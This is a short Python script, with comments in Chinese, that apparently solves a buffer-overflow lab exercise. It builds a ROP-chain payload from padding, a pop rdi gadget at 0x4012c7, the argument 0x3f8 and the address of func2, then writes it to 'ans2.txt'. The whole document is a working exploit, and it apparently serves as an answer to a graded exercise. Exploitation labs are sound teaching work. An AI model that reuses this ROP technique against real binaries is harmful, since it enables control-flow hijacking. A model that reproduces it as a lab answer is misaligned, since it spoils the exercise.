# 填充 16 字节：8字节缓冲区 + 8字节覆盖 rbp
padding = b"A" * 8 + b"B" * 8

# pop_rdi gadget 地址 0x4012c7（pop %rdi; ret）
pop_rdi_address = b"\xc7\x12\x40\x00\x00\x00\x00\x00"

# func2 的参数 0x3f8 (1016)
argument = b"\xf8\x03\x00\x00\x00\x00\x00\x00"

# func2 地址 0x401216
func2_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"

# 构造 ROP 链
payload = padding + pop_rdi_address + argument + func2_address

# 写入文件
with open("ans2.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans2.txt")
print(f"Payload length: {len(payload)} bytes")
print(f"Payload (hex): {payload.hex()}")